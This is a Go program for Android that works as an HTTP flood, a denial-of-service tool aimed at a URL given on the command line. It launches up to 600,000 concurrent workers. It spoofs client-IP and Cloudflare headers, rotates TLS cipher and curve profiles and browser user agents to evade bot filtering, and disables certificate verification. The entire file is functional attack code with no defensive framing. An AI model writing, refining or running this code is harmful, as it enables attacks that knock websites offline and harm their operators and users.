// +build android

package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/time/rate"
)

var (
	uaPool = []string{
		"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	}

	ja3Profiles = []struct {
		curves  []tls.CurveID
		ciphers []uint16
		ua      string
		headers map[string]string
	}{
		{
			curves:  []tls.CurveID{tls.X25519, tls.CurveP256},
			ciphers: []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384, tls.TLS_CHACHA20_POLY1305_SHA256},
			ua:      uaPool[0],
			headers: map[string]string{"Sec-CH-UA": `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`,"Sec-CH-UA-Mobile":"?1","Sec-CH-UA-Platform":`"Android"`},
		},
		{
			curves:  []tls.CurveID{tls.CurveP256, tls.CurveP384},
			ciphers: []uint16{tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384},
			ua:      uaPool[1],
			headers: map[string]string{"Sec-CH-UA": `"Safari";v="16.5", "iPhone";v="16.5"`,"Sec-CH-UA-Mobile":"?1","Sec-CH-UA-Platform":`"iOS"`},
		},
	}

	sent, ok, fail int64
	running        int32 = 1
)

func main() {
	var cf, autoNet, ja3, xt bool
	var mode int
	flag.BoolVar(&cf, "cloudflare", false, "")
	flag.BoolVar(&ja3, "ja3", true, "")
	flag.BoolVar(&xt, "extreme-headers", true, "")
	flag.IntVar(&mode, "mode", 3, "")
	flag.BoolVar(&autoNet, "autonetwork", true, "")
	flag.Parse()

	args := flag.Args()
	if len(args) < 2 || strings.ToUpper(args[0]) != "ULTIMATE" {
		return
	}
	rawURL := args[1]
	u, _ := url.Parse(rawURL)

	workers := map[int]int{1: 3000, 2: 15000, 3: 30000, 4: 60000, 5: 120000, 6: 300000, 7: 600000}[mode]

	go statusPrinter()
	lim := rate.NewLimiter(rate.Every(time.Microsecond*100), 100)
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(ctx, lim, rawURL, u.Host, cf, ja3, xt, autoNet)
		}()
	}
	<-ctx.Done()
	atomic.StoreInt32(&running, 0)
	wg.Wait()
}

func statusPrinter() {
	for atomic.LoadInt32(&running) == 1 {
		fmt.Printf("\rSENT: %d | OK: %d | FAIL: %d",
			atomic.LoadInt64(&sent), atomic.LoadInt64(&ok), atomic.LoadInt64(&fail))
		time.Sleep(150 * time.Millisecond)
	}
}

func worker(ctx context.Context, lim *rate.Limiter, raw, host string, cf, ja3, xt, autoNet bool) {
	d := net.Dialer{KeepAlive: 30 * time.Second}
	prof := ja3Profiles[rand.Intn(len(ja3Profiles))]
	tr := &http.Transport{
		DialContext: func(c context.Context, netw, addr string) (net.Conn, error) {
			return d.DialContext(c, netw, addr)
		},
		TLSClientConfig: &tls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
			CurvePreferences:   prof.curves,
			CipherSuites:       prof.ciphers,
		},
		ForceAttemptHTTP2: true,
		MaxIdleConns:      0,
		IdleConnTimeout:   90 * time.Second,
	}
	_ = http2.ConfigureTransport(tr)
	cl := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for {
		select {
		case <-ctx.Done(): return
		default:
		}
		if autoNet && atomic.LoadInt64(&fail) > atomic.LoadInt64(&sent)/3 {
			time.Sleep(200 * time.Millisecond)
		}
		lim.Wait(ctx)
		fire(cl, raw, host, prof, cf, ja3, xt)
	}
}

func fire(cl *http.Client, raw, host string, prof struct{ curves []tls.CurveID; ciphers []uint16; ua string; headers map[string]string }, cf, ja3, xt bool) {
	atomic.AddInt64(&sent, 1)
	req, _ := http.NewRequest("GET", raw, nil)
	req.Header.Set("User-Agent", prof.ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("X-Forwarded-For", randIP())
	req.Header.Set("X-Real-IP", randIP())
	req.Header.Set("X-Client-IP", randIP())

	if cf {
		req.Header.Set("CF-Connecting-IP", randIP())
		req.Header.Set("CF-Ray", randCFRay())
		req.Header.Set("True-Client-IP", randIP())
	}
	if ja3 {
		for k, v := range prof.headers {
			req.Header.Set(k, v)
		}
	}
	if xt {
		req.Header.Set("Referer", randReferer())
		req.Header.Set("Origin", randOrigin())
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		req.Header.Set("X-Request-ID", randID())
		req.Header.Set("X-Correlation-ID", randID())
	}

	resp, err := cl.Do(req)
	if err != nil {
		atomic.AddInt64(&fail, 1)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode == 200 || resp.StatusCode == 206 {
		atomic.AddInt64(&ok, 1)
	} else {
		atomic.AddInt64(&fail, 1)
	}
}

func randIP() string   { return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(253)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255)) }
func randCFRay() string { b := make([]byte, 16); rand.Read(b); return fmt.Sprintf("%x-%05d", b[:10], rand.Intn(99999)) }
func randID() string    { return fmt.Sprintf("%x-%x-%x-%x", rand.Uint32(), rand.Uint32(), rand.Uint32(), rand.Uint32()) }
func randReferer() string {
	list := []string{"https://www.google.com/", "https://www.bing.com/", "https://github.com/", "https://reddit.com/"}
	return list[rand.Intn(len(list))]
}
func randOrigin() string {
	list := []string{"https://www.google.com", "https://www.bing.com", "https://cdn.cloudflare.com"}
	return list[rand.Intn(len(list))]
}
